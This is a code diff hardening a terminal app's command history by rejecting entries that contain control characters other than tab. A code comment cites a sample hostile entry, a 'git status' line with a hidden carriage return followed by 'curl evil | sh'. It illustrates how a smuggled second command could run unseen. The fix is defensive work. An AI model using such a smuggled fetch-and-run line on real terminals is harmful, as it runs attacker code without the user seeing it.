@@ -126,6 +126,23 @@ function persistHistory() {
 }
 
 /**
+ * A control character anywhere in a history entry — any but a tab.
+ *
+ * The history is TYPED back into a shell: accepting a suggestion writes the
+ * rest of the entry to the pty, and so does picking one in the History
+ * palette. A saved `git status\r…curl evil | sh\r` would run both lines, with
+ * only the first on screen, and it is not only CR and LF: `^O` in bash runs
+ * the line too. So an entry holding one is refused both on the way in and on
+ * the way back from disk.
+ *
+ * A tab is the exception. Typed back it only asks the shell to complete, and
+ * it is the one control byte a real entry has: typed keys never reach the
+ * input buffer as control bytes, but a paste is folded in whole unless it has
+ * CR, LF, ^C, ESC or DEL, and a pasted tab survives that.
+ */
+const CONTROL_CHAR = /[\x00-\x08\x0a-\x1f\x7f]/;
+
+/**
  * Read back what an earlier session ran. Called once, by the app's bootstrap.
  *
  * Tolerant of anything: this is a file on the user's disk, and one bad entry
@@ -137,7 +154,7 @@ export function loadCommandHistory() {
   let restored = 0;
   for (const entry of saved) {
     const command = typeof entry?.c === 'string' ? entry.c.trim() : '';
-    if (!command || historyFreq.has(command)) continue;
+    if (!command || CONTROL_CHAR.test(command) || historyFreq.has(command)) continue;
     historyLog.push(command);
     historyFreq.set(command, Number.isFinite(entry.n) && entry.n > 0 ? entry.n : 1);
     historyMeta.set(command, {
@@ -154,7 +171,7 @@ const HISTORY_LIMIT = 500;
 
 export function recordCommand(cmd, { cwd = null, at = Date.now() } = {}) {
   const trimmed = (cmd || '').trim();
-  if (!trimmed) return;
+  if (!trimmed || CONTROL_CHAR.test(trimmed)) return;
   historyLog = historyLog.filter((c) => c !== trimmed);
   historyLog.push(trimmed);
   historyFreq.set(trimmed, (historyFreq.get(trimmed) || 0) + 1);
